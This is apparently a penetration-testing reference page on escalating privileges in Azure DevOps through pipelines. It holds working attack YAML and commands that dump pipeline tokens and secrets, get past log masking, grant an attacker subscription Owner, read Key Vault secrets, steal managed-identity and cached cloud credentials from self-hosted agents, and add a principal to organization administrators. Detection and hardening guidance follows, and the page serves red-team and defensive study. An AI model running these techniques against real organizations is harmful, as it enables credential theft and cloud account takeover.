---
cstg_id: CSTG-AZURE-DEVOPS-PRIVESC
title: "AZURE Devops - Privilege Escalation"
provider: azure
service: devops
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Contributor / Build Administrator (queue or edit pipelines)"
  - "Edit build pipeline / Edit YAML (Build namespace: EditBuildDefinition)"
  - "Generic Contribute on a repository (Git namespace: GenericContribute)"
  - "Administer service connection / Use service connection (Endpoints namespace)"
  - "Edit variable groups / secure files (Library)"
  - "Manage queue / Administer agent pool (DistributedTask namespace)"
  - "Project Collection Administrators (org-level escalation)"
tools:
  - "Azure DevOps REST API"
  - "Azure CLI (az, az devops)"
  - "Git CLI"
  - "Pipeline YAML"
references:
  - "https://learn.microsoft.com/en-us/azure/devops/pipelines/security/overview"
  - "https://learn.microsoft.com/en-us/azure/devops/pipelines/process/access-tokens"
  - "https://learn.microsoft.com/en-us/azure/devops/pipelines/library/service-endpoints"
  - "https://learn.microsoft.com/en-us/azure/devops/pipelines/security/repos-protection"
  - "https://learn.microsoft.com/en-us/azure/devops/organizations/security/permissions"
  - "https://www.hackingthe.cloud/azure/"
  - "https://research.nccgroup.com/2022/01/13/10-real-world-stories-of-how-weve-compromised-ci-cd-pipelines/"
  - "https://rhinosecuritylabs.com/cloud-security/"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation in Azure DevOps almost always pivots through **pipeline execution**. The core principle: whoever can cause a pipeline to run, or modify what a pipeline runs, inherits the privileges of every resource that pipeline is authorized to use — most importantly the **service connections** (cloud identities), **variable groups**, **secure files**, and the **build service identity** (`System.AccessToken`). Because pipelines routinely hold subscription-scoped Azure RBAC roles, a low-privileged project member who can edit a YAML file frequently escalates to Azure subscription Owner.

This page enumerates the major escalation primitives:

1. Editing pipeline definitions (poisoned pipeline execution) to exfiltrate secrets and abuse service connections.
2. Abusing the build service identity (`System.AccessToken`) to act across the project/organization.
3. Pivoting from a service connection's Entra ID service principal into Azure, AWS, registries, or Key Vault.
4. Self-hosted agent compromise to harvest ambient credentials.
5. Permission/ACL manipulation and group membership changes to reach Project Collection Administrators.

Enumeration of the resources referenced here is covered in [azure-devops-enum.md](../02-services/azure-devops-enum.md); persistence techniques that follow escalation are in [azure-devops-persistence.md](../06-persistence/azure-devops-persistence.md).

## Prerequisites

- An authenticated principal with at least one of: ability to edit a pipeline definition, push to a branch that a pipeline builds, queue an existing pipeline, edit a variable group/secure file, or administer a service connection / agent pool.
- Knowledge (from enumeration) of which pipelines are authorized to use which service connections and variable groups, and the Azure scope/role those connections hold.
- Egress to `dev.azure.com` and to the target cloud control planes (`management.azure.com`, AWS endpoints, registry hosts).

## Exploitation

### Edit build pipeline / Edit YAML (poisoned pipeline execution)

If you can modify a pipeline's YAML (directly, or by pushing to a branch the pipeline triggers on), you control the commands executed on the agent with full access to the pipeline's authorized resources. The classic outcome is dumping every secret the pipeline can reach.

A malicious step that exfiltrates the build token and all environment-injected secrets:

```yaml
steps:
- script: |
    # Build service identity token - can call ADO APIs as the project build service
    echo "ACCESS_TOKEN=$(System.AccessToken)"
    # Dump all environment variables (secret variables become env vars when mapped)
    env | base64 -w0
  env:
    SYSTEM_ACCESSTOKEN: $(System.AccessToken)
    SECRET_FROM_GROUP: $(mySecretVar)   # forces a masked secret into a controllable transform
- script: |
    # Use an authorized azurerm service connection to act in Azure
    az account show
    az role assignment list --all -o json
```

To run arbitrary Azure commands under an `azurerm` service connection, use the `AzureCLI@2` task, which logs the service principal in for you:

```yaml
- task: AzureCLI@2
  inputs:
    azureSubscription: 'prod-azurerm-connection'   # an authorized service connection
    scriptType: bash
    scriptLocation: inlineScript
    inlineScript: |
      az ad signed-in-user show 2>/dev/null || az account show
      az role assignment list --assignee $(az account show --query user.name -o tsv) --all
      # Escalate: grant a controlled principal Owner, create resources, read Key Vault, etc.
      az keyvault secret list --vault-name prod-kv
```

Defeating secret masking: masked secrets are still usable; reflection, base64/hex encoding, reversing, or splitting the value across lines bypasses literal-string redaction in logs. Avoid relying on the agent printing them — instead use them to call out (e.g., authenticate to the cloud, write to a controlled feed/storage).

**Fork and untrusted-branch builds:** if PR validation builds run with access to secrets/service connections, an external or low-privileged actor opening a pull request that edits the pipeline can achieve the same result without write access to protected branches. Look for missing branch control / "Build pull requests from forks" with secrets enabled.

### GenericContribute on a repository (source-driven pipeline poisoning)

Where direct pipeline editing is restricted but you can push commits, target:
- The pipeline YAML if it is read from the same repo and branch you can write to.
- Build scripts, `Makefile`, `Dockerfile`, `npm`/`pip`/`gradle` build hooks, or referenced template files the pipeline executes.
- `package.json` lifecycle scripts and similar, which run during dependency install on the agent.

```bash
git clone "https://x:$ADO_PAT@dev.azure.com/$ORG/$PROJECT/_git/$REPO"
# add a malicious build hook, commit to a branch that triggers CI
git checkout -b feature/ci-test
# ...modify azure-pipelines.yml or a build script...
git commit -am "ci: update build" && git push origin feature/ci-test
```

### Use / Administer service connection (cloud pivot)

A pipeline authorized to use an `azurerm` service connection can authenticate as that connection's Entra ID service principal (or managed identity / federated identity). From there, escalation depends on the principal's Azure RBAC:

```yaml
- task: AzureCLI@2
  inputs:
    azureSubscription: 'over-privileged-connection'
    scriptType: bash
    scriptLocation: inlineScript
    inlineScript: |
      SUB=$(az account show --query id -o tsv)
      # If the SP has Owner/User Access Administrator on the subscription:
      az role assignment create --assignee <attacker-app-or-user-objectId> \
        --role Owner --scope /subscriptions/$SUB
      # Read all Key Vault secrets the SP can access
      for v in $(az keyvault list --query "[].name" -o tsv); do
        az keyvault secret list --vault-name "$v" -o tsv
      done
```

For other connection types: `aws` connections expose AWS access keys/role assumption; `dockerregistry`/`kubernetes` connections expose registry creds and cluster kubeconfig; `generic` connections store arbitrary credentials. If you can **administer** a connection you can also rebind it (see persistence) or share it to additional pipelines.

### Abuse of the build service identity (System.AccessToken)

`System.AccessToken` is the OAuth token for the project's build service account (e.g., `{Project} Build Service ({Org})`). When the pipeline option "Allow scripts to access the OAuth token" is enabled, this token can call the ADO REST API. Depending on the build service account's permissions it may:

- Read/modify other repos in the project (push backdoored code, create branches).
- Queue other pipelines, including ones with more powerful service connections.
- Create or update variable groups, service connections, and PATs in some configurations.
- Update work items and pull requests.

```yaml
- script: |
    TOKEN=$(System.AccessToken)
    curl -s -H "Authorization: Bearer $TOKEN" \
      "https://dev.azure.com/$(System.CollectionUri)/_apis/git/repositories?api-version=7.1"
  env:
    SYSTEM_ACCESSTOKEN: $(System.AccessToken)
```

If the build service identity is a member of an elevated group (commonly granted Contribute or even Project Administrator by misconfiguration), this token is a direct lateral/escalation primitive within the organization.

### Edit variable groups / secure files (Library)

Editing a variable group lets you inject a malicious secret or repoint a Key Vault-linked group. Adding a new variable group reference to a pipeline you control, or modifying a secure file (e.g., swapping a deployment cert/`kubeconfig`), can broaden the secrets and targets reachable from a single run.

### Manage queue / Administer agent pool (self-hosted agent compromise)

Self-hosted agents run pipeline jobs on machines that frequently have:
- A managed identity (`az login --identity` yields a token for the VM's identity).
- Cached `az`/`gcloud`/`aws` credentials and `~/.docker/config.json`.
- Mounted Docker socket enabling host breakout.
- Network reachability to internal systems.

A pipeline targeting a compromised or attacker-controllable pool can harvest these:

```yaml
pool: 'self-hosted-prod'
steps:
- script: |
    # Try the VM's managed identity (IMDS)
    curl -s -H Metadata:true \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    cat ~/.azure/accessTokens.json 2>/dev/null
    cat ~/.docker/config.json 2>/dev/null
    az account show 2>/dev/null
```

If you can **administer** a pool, you can register your own agent into it and intercept jobs (and their secrets) destined for that pool.

### Project Collection Administrators (organization takeover)

Reaching membership of **Project Collection Administrators (PCA)** is full organizational control. Paths include:
- Manipulating group membership via the Graph API if you hold sufficient permissions, or via a build service token that is itself a PCA member.
- ACL manipulation in the security namespaces (granting `Allow` on critical bits — `GenericContribute`, `Administer`, `ManagePermissions`) to a controlled principal.

```bash
# Add a principal to a group (requires sufficient membership-management permission)
curl -s -u :$ADO_PAT -X PUT \
  "https://vssps.dev.azure.com/$ORG/_apis/graph/memberships/{subjectDescriptor}/{containerDescriptor}?api-version=7.1-preview.1"
```

Once PCA is obtained, every project, connection, and secret in the organization is reachable, and the cloud subscriptions behind every `azurerm` connection become candidate targets.

## Detection & Logging

- **Azure DevOps Auditing** events: `Library.ServiceConnectionExecuteAuthorized`, `Pipelines.PipelineModified`/`Release.ReleaseDefinitionUpdated`, `Library.VariableGroupModified`, `Security.ModifyPermission`, `Group.UpdateGroupMembership`, `Token.PatCreateEvent`, and agent/pool registration events.
- Unusual pipeline edits followed immediately by a manual queue, edits to YAML adding `AzureCLI`/`script` steps, or builds run from non-default/feature branches that touch privileged connections.
- **Entra ID sign-in logs** showing service-principal sign-ins for `azurerm` connection app IDs from pipeline egress, especially outside normal deployment windows.
- **Azure Activity Logs** in target subscriptions: `Microsoft.Authorization/roleAssignments/write` (new role grants), `Microsoft.KeyVault/vaults/secrets/...` reads, and resource creation correlated to a service connection principal.
- New agents registering to a pool, or jobs running on unexpected pools.
- Build logs containing base64/hex blobs or `env` dumps (secret-exfiltration tell-tales).

## Remediation & Hardening

- Treat pipeline edit rights as equivalent to the rights of every resource the pipeline can use. Require pull-request review and **branch control / protected-resource checks** before privileged connections or variable groups are usable.
- Do not run PR/fork builds with access to secrets or service connections; disable "make secrets available to builds of forks."
- Scope `azurerm` service connections to least Azure RBAC role and narrowest scope; prefer **Workload Identity Federation** so no secret is stored, and constrain the federated subject to specific pipelines/branches/environments.
- Disable "Allow scripts to access the OAuth token" unless required; ensure the build service identity has minimal project permissions and is never a member of PCA/Project Admin.
- Turn off "grant access to all pipelines" for connections, variable groups, secure files, and pools; enforce approvals and pipeline allowlists.
- Use Microsoft-hosted or ephemeral, least-privilege self-hosted agents without ambient cloud identities or Docker-socket exposure.
- Tightly restrict membership of Project Collection Administrators, Endpoint Administrators, Build Administrators; alert on group membership and ACL changes.
- Enforce secret/credential scanning and block plaintext secrets in repos, logs, and variables.

## Tools

- Azure DevOps REST API and Auditing API
- Azure CLI (`az`, `az devops` extension)
- Git CLI
- Pipeline YAML (poisoned pipeline execution)

## References

- Azure Pipelines security overview — https://learn.microsoft.com/en-us/azure/devops/pipelines/security/overview
- Pipeline access tokens (System.AccessToken) — https://learn.microsoft.com/en-us/azure/devops/pipelines/process/access-tokens
- Service connections — https://learn.microsoft.com/en-us/azure/devops/pipelines/library/service-endpoints
- Protecting repositories / branch control — https://learn.microsoft.com/en-us/azure/devops/pipelines/security/repos-protection
- Permissions and security namespaces — https://learn.microsoft.com/en-us/azure/devops/organizations/security/permissions
- NCC Group — 10 real-world stories of compromising CI/CD pipelines — https://research.nccgroup.com/2022/01/13/10-real-world-stories-of-how-weve-compromised-ci-cd-pipelines/
- Rhino Security Labs cloud research — https://rhinosecuritylabs.com/cloud-security/
- hackingthe.cloud (Azure) — https://www.hackingthe.cloud/azure/
